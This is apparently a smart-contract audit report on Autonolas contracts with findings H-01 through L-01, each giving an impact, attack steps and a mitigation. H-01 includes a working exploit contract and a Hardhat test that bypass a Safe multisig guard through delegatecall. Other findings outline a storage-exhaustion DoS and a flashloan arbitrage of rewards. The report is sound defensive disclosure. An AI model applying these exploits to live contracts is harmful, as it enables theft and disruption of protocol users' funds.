## [H-01] CM can `delegatecall` to any address and bypass all restrictions

### Lines of code

[GuardCM.sol#L427-L429](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/multisigs/GuardCM.sol#L427-L429)  
[GuardCM.sol#L400](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/multisigs/GuardCM.sol#L400)

### Impact
The [`GuardCM`](https://github.com/code-423n4/2023-12-autonolas/blob/main/governance/contracts/multisigs/GuardCM.sol) contract is designed to restrict the Community Multisig (CM) actions within the protocol to only specific contracts and methods. This is achieved by implementing a [`checkTransaction()`](https://github.com/code-423n4/2023-12-autonolas/blob/main/governance/contracts/multisigs/GuardCM.sol#L387) method, which is invoked by the CM `GnosisSafe` [before every transaction](https://github.com/safe-global/safe-contracts/blob/186a21a74b327f17fc41217a927dea7064f74604/contracts/GnosisSafe.sol#L147-L167). When `GuardCM` is not paused, the implementation restricts calls to the `schedule()` and `scheduleBatch()` methods in the timelock to only specific targets and selectors, performs additional checks on calls forwarded to the L2s and blocks self-calls on the CM itself, which prevents it from unilaterally removing the guard:
```solidity
	if (to == owner) {
		// No delegatecall is allowed
		if (operation == Enum.Operation.DelegateCall) {
			revert NoDelegateCall();
		}

		// Data needs to have enough bytes at least to fit the selector
		if (data.length < SELECTOR_DATA_LENGTH) {
			revert IncorrectDataLength(data.length, SELECTOR_DATA_LENGTH);
		}

		// Get the function signature
		bytes4 functionSig = bytes4(data);
		// Check the schedule or scheduleBatch function authorized parameters
		// All other functions are not checked for
		if (functionSig == SCHEDULE || functionSig == SCHEDULE_BATCH) {
			// Data length is too short: need to have enough bytes for the schedule() function
			// with one selector extracted from the payload
			if (data.length < MIN_SCHEDULE_DATA_LENGTH) {
				revert IncorrectDataLength(data.length, MIN_SCHEDULE_DATA_LENGTH);
			}

			_verifySchedule(data, functionSig);
		}
	} else if (to == multisig) {
		// No self multisig call is allowed
		revert NoSelfCall();
	}
```

However, a critical oversight in the current implementation allows the CM to perform `delegatecall`s to any address but the timelock. As can be seen above, `DelegateCall` operations are only disallowed when the target is the timelock (represented by the `owner` variable). What this effectively means is that the CM cannot run any `Timelock` function in its own context, but it can `delegatecall` to any other contract and hence execute arbitrary code. This allows it to trivially bypass the guard by delegating to a contract that removes the guard variable from the CM's storage.

The CM holds all privileged roles within the timelock, which is in turn the protocol's owner. This means that the CM can potentially gain unrestricted control over the entire protocol. As such, this vulnerability represents a significant risk of privilege escalation and is classified as high severity.
### Proof of Concept

We can validate the vulnerability through an additional test case for the `GuardCM.js` test suite. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:
1. It sets up the guard using the `setGuard` function with the appropriate parameters.
2. It attempts to execute an unauthorized call via delegatecall to the timelock, which should be reverted by the guard as expected.
3. It deploys an exploit contract, which contains a function to delete the guard storage.
4. It calls the `deleteGuardStorage` function through a delegatecall from the CM, which will remove the guard variable from the safe's storage.
5. It repeats the unauthorized call from step 2. This time, the call succeeds, indicating that the guard has been bypassed.

A simple exploit contract could look as follows:
```solidity
pragma solidity ^0.8.0;

contract DelegatecallExploitContract {
    bytes32 internal constant GUARD_STORAGE_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;

    function deleteGuardStorage() public {
        assembly {
            sstore(GUARD_STORAGE_SLOT, 0)
        }
    }
}
```

And the test:
```javascript
        it("CM can remove guard through delegatecall", async function () {
            // Setting the CM guard
            let nonce = await multisig.nonce();
            let txHashData = await safeContracts.buildContractCall(multisig, "setGuard", [guard.address], nonce, 0, 0);
            let signMessageData = new Array();
            for (let i = 1; i <= safeThreshold; i++) {
                signMessageData.push(await safeContracts.safeSignMessage(signers[i], multisig, txHashData, 0));
            }
            await safeContracts.executeTx(multisig, txHashData, signMessageData, 0);

            // Attempt to execute an unauthorized call
            let payload = treasury.interface.encodeFunctionData("pause");
            nonce = await multisig.nonce();
            txHashData = await safeContracts.buildContractCall(timelock, "schedule", [treasury.address, 0, payload,
                Bytes32Zero, Bytes32Zero, 0], nonce, 0, 0);
            for (let i = 0; i < safeThreshold; i++) {
                signMessageData[i] = await safeContracts.safeSignMessage(signers[i+1], multisig, txHashData, 0);
            }
            await expect(
                safeContracts.executeTx(multisig, txHashData, signMessageData, 0)
            ).to.be.reverted;

            // Deploy and delegatecall to exploit contract
            const DelegatecallExploitContract = await ethers.getContractFactory("DelegatecallExploitContract");
            const exploitContract = await DelegatecallExploitContract.deploy();
            await exploitContract.deployed();
            nonce = await multisig.nonce();
            txHashData = await safeContracts.buildContractCall(exploitContract, "deleteGuardStorage", [], nonce, 1, 0);
            for (let i = 0; i < safeThreshold; i++) {
                signMessageData[i] = await safeContracts.safeSignMessage(signers[i+1], multisig, txHashData, 0);
            }
            await safeContracts.executeTx(multisig, txHashData, signMessageData, 0);

            // Unauthorized call succeeds since we have removed the guard
            nonce = await multisig.nonce();
            txHashData = await safeContracts.buildContractCall(timelock, "schedule", [treasury.address, 0, payload,
                Bytes32Zero, Bytes32Zero, 0], nonce, 0, 0);
            for (let i = 0; i < safeThreshold; i++) {
                signMessageData[i] = await safeContracts.safeSignMessage(signers[i+1], multisig, txHashData, 0);
            }
            await safeContracts.executeTx(multisig, txHashData, signMessageData, 0);
        });
```

To run the exploit test:
- Save the exploit contract somewhere under the `governance` directory as `DelegatecallExploitContract.sol`.
- Add the test to the `"Timelock manipulation via the CM"` context in `governance/test/GuardCM.js` and run it using the command `npx hardhat test --grep "CM cannot bypass guard through delegatecall"`. This will run the test above, which should demonstrate the exploit by successfully making an unauthorized call after the guard has been bypassed.

### Tools Used
Hardhat

### Recommended Mitigation Steps
Disallow `delegatecall`s entirely: 
```diff
@@ -397,15 +397,14 @@ contract GuardCM {
         bytes memory,
         address
     ) external {
+        // No delegatecall is allowed
+        if (operation == Enum.Operation.DelegateCall) {
+            revert NoDelegateCall();
+        }
         // Just return if paused
         if (paused == 1) {
             // Call to the timelock
             if (to == owner) {
-                // No delegatecall is allowed
-                if (operation == Enum.Operation.DelegateCall) {
-                    revert NoDelegateCall();
-                }
-
                 // Data needs to have enough bytes at least to fit the selector
                 if (data.length < SELECTOR_DATA_LENGTH) {
```


## [H-02] Permanent DOS in `liquidity_lockbox` for under $10

### Lines of code

[liquidity_lockbox.sol#L54](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L54)  
[liquidity_lockbox.sol#L181-L184](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L181-L184)

### Impact
The `liquidity_lockbox` contract in the `lockbox-solana` project is vulnerable to permanent DOS due to its storage limitations. The contract uses a Program Derived Address (PDA) as a data account, which is created with a maximum size limit of 10 KB. 

Every time the `deposit()` function is called, a new element is added to `positionAccounts`, `mapPositionAccountPdaAta`, and `mapPositionAccountLiquidity`, which decreases the available storage by `64 + 32 + 32 = 128` bits. This means that the contract will run out of space after at most `80000 / 128 = 625` deposits.

Once the storage limit is reached, no further deposits can be made, effectively causing a permanent DoS condition. This could be exploited by an attacker to block the contract's functionality at a very small cost.

### Proof of Concept
An attacker can cause a permanent DoS of the contract by calling `deposit()` with the minimum position size only 625 times. This will fill up the storage limit of the PDA, preventing any further deposits from being made.

Since neither the contract nor seemingly Orca's pool contracts impose a limitation on the minimum position size, this can be achieved at a very low cost of `625 * dust * transaction fees`:

<img width="400" alt="no min deposit in SOL/OLAS pool" src="https://github.com/code-423n4/org/assets/153658521/48ca4eb0-5a4f-4310-a9ac-7869afa17ae8">

### Tools Used
Manual review

### Recommended Mitigation Steps
The maximum size of a PDA is 10 **KiB** on creation, only slightly larger than the current allocated space of 10 KB. The Solana SDK does provide a method to resize a data account ([source](https://docs.rs/solana-sdk/latest/solana_sdk/account_info/struct.AccountInfo.html#method.realloc)), but this functionality isn't currently implemented in Solang ([source](https://github.com/hyperledger/solang/issues/1434)).

A potential solution to this issue is to use an externally created account as a data account, which can have a size limit of up to 10 MiB, as explained in this [StackExchange post](https://solana.stackexchange.com/a/46). 

Alternatively, free up space by [clearing](https://solang.readthedocs.io/en/latest/language/contract_storage.html#how-to-clear-contract-storage) the aforementioned variables in storage for withdrawn positions.

However, a more prudent security recommendation would be to leverage the Solana SDK directly, despite the potential need for contract reimplementation and the learning curve associated with Rust. The Solana SDK offers greater flexibility and is less likely to introduce unforeseen vulnerabilities. Solang, while a valuable tool, is still under active development and will usually lag behind the SDK, which could inadvertently introduce complexity and potential vulnerabilities due to compiler discrepancies.


## [M-01] Griefing attack on `liquidity_lockbox` withdrawals due to lack of minimum deposit

### Lines of code

[liquidity_lockbox.sol#L140-L190](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L140-L190)

### Impact
The [`liquidity_lockbox`](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol) contract does not enforce a minimum deposit limit. This allows a user to open many positions with minimum liquidity, forcing other users to close these positions one by one in order to withdraw. This could lead to a griefing attack where the transaction cost accounts for a large portion of the withdrawn amount. 

While transactions on Solana are cheap and it is difficult to assess the cost of a withdrawal as the external call on line fails, an accumulation of small deposits as portrayed will in any case disrupt contract operations by making substantial fund withdrawals labor-intensive.

The root cause of this issue is the lack of a minimum deposit threshold in the [`deposit()`](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L140) function in `lockbox-solana/solidity/liquidity_lockbox.sol`.

### Proof of Concept
Consider the following scenario:

1. Alice, a malicious user, opens a large number of positions with minimum liquidity in the `liquidity_lockbox` contract.
2. Bob, a regular user, wants to withdraw his funds. However, he is forced to close Alice's positions one by one due to the lack of a minimum deposit threshold.
3. The transaction cost for Bob becomes a significant portion of the withdrawn amount, making the withdrawal of funds inefficient and costly.

### Tools Used
Manual review

### Recommended Mitigation Steps
To mitigate this issue, a minimum deposit threshold should be implemented in the `deposit()` function. This would prevent users from opening positions with minimum liquidity and protect other users from potential griefing attacks. The threshold should be carefully chosen to balance the need for user flexibility and the protection against potential attacks. Additionally, consider implementing a mechanism to batch close positions to further protect against such scenarios.


## [M-02] LP rewards in `liquidity_lockbox` can be arbitraged

### Lines of code

[liquidity_lockbox.sol#L295-L307](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L295-L307)

### Impact
The [`liquidity_lockbox`](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol) contract is designed to handle liquidity positions in a specific Orca LP pool. Users can deposit their LP NFTs into the contract, receiving in exchange tokens according to their position size. These tokens are minted with the goal of allowing users to bridge them to Ethereum later on and exchange them for OLAS at a discount.

However, a potential vulnerability arises from the unrestricted nature of the deposit and withdrawal functions. Specifically, a user can deposit a large amount of assets and immediately withdraw all existing positions using the tokens they just received. This sequence of actions can be repeated to continuously exploit the LP rewards system, leading to an unfair distribution of rewards.

The root cause of this issue lies in the `withdraw()` function, which does not have any restrictions or checks that prevent immediate withdrawal after a deposit and pays all accrued LP rewards [to the caller](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L295-L307).

## Proof of Concept
Consider the following scenario:

1. Alice obtains a large amount of tokens either through a [flashloan](https://github.com/solendprotocol/solana-program-library/blob/master/token-lending/program/src/processor.rs#L102) or by buying them.
2. Alice uses these tokens to open a large position in the Orca pool.
3. Alice deposits the position NFT into the `liquidity_lockbox` contract, receiving a large amount of bridge tokens.
4. Alice withdraws all existing positions using the tokens she just received and receives the LP rewards.
5. Alice closes the received positions in the Orca pool, repays the flashloan (if used) and pockets the rewards.

This sequence of actions can be repeated by Alice to continuously exploit the LP rewards system.

### Tools Used
Manual review

### Recommended Mitigation Steps
To mitigate this issue, a possible solution could be to implement a lock-up period for deposited positions. This would prevent users from immediately withdrawing their positions after depositing. Additionally, consider not distributing rewards to the withdrawing user (which will never be fair) and instead collecting them for the protocol.


## [M-03] Withdraw amount returned by `getLiquidityAmountsAndPositions` may be incorrect

### Lines of code

[liquidity_lockbox.sol#L377](https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L377)

### Impact
The `getLiquidityAmountsAndPositions()` function in the `liquidity_lockbox` contract is used to calculate the liquidity amounts and positions to be withdrawn for a given total withdrawal amount. It iterates through each deposited position following a FIFO order as shown below:

```solidity
        uint64 liquiditySum = 0;
        uint32 numPositions = 0;
        uint64 amountLeft = 0;

        // Get the number of allocated positions
        for (uint32 i = firstAvailablePositionAccountIndex; i < numPositionAccounts; ++i) {
            address positionAddress = positionAccounts[i];
            uint64 positionLiquidity = mapPositionAccountLiquidity[positionAddress];

            // Increase a total calculated liquidity and a number of positions to return
            liquiditySum += positionLiquidity;
            numPositions++;

            // Check if the accumulated liquidity is enough to cover the requested amount
            if (liquiditySum >= amount) {
                amountLeft = liquiditySum - amount;
                break;
            }
        }
```

However, there is an error in the calculation of the last position amount when it entails a partial withdrawal. The `amountLeft` variable represents the leftover liquidity in the last position after the user's withdrawals, but it is assigned to the returned amounts as if it represented the amount the user should withdraw:

```solidity
        // Adjust the last position, if it was not fully allocated
        if (numPositions > 0 && amountLeft > 0) {
            positionAmounts[numPositions - 1] = amountLeft;
        }
```

This discrepancy could lead to users withdrawing an incorrect amount if they use `getLiquidityAmountsAndPositions()`, as intended, to obtain positions and amounts to use when calling `withdraw()`. This can result in significant unintended transfer of funds for the user, especially in cases where the last position in `positionAmounts` is of significant size. Given the fact that this issue can occur under normal usage of the contract, this issue is assessed as medium severity.

### Proof of Concept
Consider the following step-by-step scenario:

1. Alice has a large amount of bridged tokens.
2. Alice decides to withdraw a small portion of her liquidity. She has written a script that calls `getLiquidityAmountsAndPositions()` to calculate the positions and amounts for the withdrawal and iterates through the returned arrays in a series of calls to `withdraw()`.
3. The `firstAvailablePositionAccountIndex` points to a very large position, which causes `getLiquidityAmountsAndPositions()` to return an amount much larger than Alice intended.
4. Alice unknowingly passes the returned amount to `withdraw` and as a result ends up withdrawing far more tokens than she intended, potentially depleting her liquidity in the contract.

### Tools Used
Manual review

### Recommended Mitigation Steps
To fix this issue, the last position amount should be reduced by the remaining amount when the accumulated liquidity is not fully allocated. This can be achieved by changing the assignment operation to a subtraction operation:

```diff
@@ -374,7 +374,7 @@ contract liquidity_lockbox {
 
         // Adjust the last position, if it was not fully allocated
         if (numPositions > 0 && amountLeft > 0) {
-            positionAmounts[numPositions - 1] = amountLeft;
+            positionAmounts[numPositions - 1] -= amountLeft;
         }
     }
```

This change ensures that the last position amount is correctly calculated, preventing users from withdrawing an incorrect amount.

## [L-01] `Tokenomics.checkpoint()` may be called on implementation contract directly

_This issue was downgraded from Medium to Low_

### Lines of code

[Tokenomics.sol#L881-L890](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L881-L890)  
[Tokenomics.sol#L264](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L264)

### Impact
The `Tokenomics` contract contains a function [`checkpoint()`](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L880), which implements a check to prevent it from being called on the implementation contract directly:

```solidity
        // Get the implementation address that was written to the proxy contract
        address implementation;
        assembly {
            implementation := sload(PROXY_TOKENOMICS)
        }
        // Check if there is any address in the PROXY_TOKENOMICS address slot
        if (implementation == address(0)) {
            revert DelegatecallOnly();
        }
```

However, this check can be bypassed by [initializing](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L264) the implementation and then calling [`changeTokenomicsImplementation()`](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L384). 

While the implications of this bypass are not immediately clear, it is generally considered bad practice for implementation contracts to be initializable since it can lead to unexpected behavior and potential security vulnerabilities. Moreover, the authors of the code may have put this check in place with the intention of relying on it for further development. If this assumption is violated, it could lead to vulnerabilities in future code. 

### Proof of Concept
`checkpoint()` may be called on the implementation contract by following these steps:

1. Call `initializeTokenomics()` on the implementation contract, becoming its owner.
2. Call `changeTokenomicsImplementation()` with any non-zero argument.
3. Call `checkpoint()`.

### Tools Used
Manual review

### Recommended Mitigation Steps
To mitigate this issue, it is recommended to replicate this check in `initializeTokenomics()`. This would ensure that the implementation contract cannot be initialized.

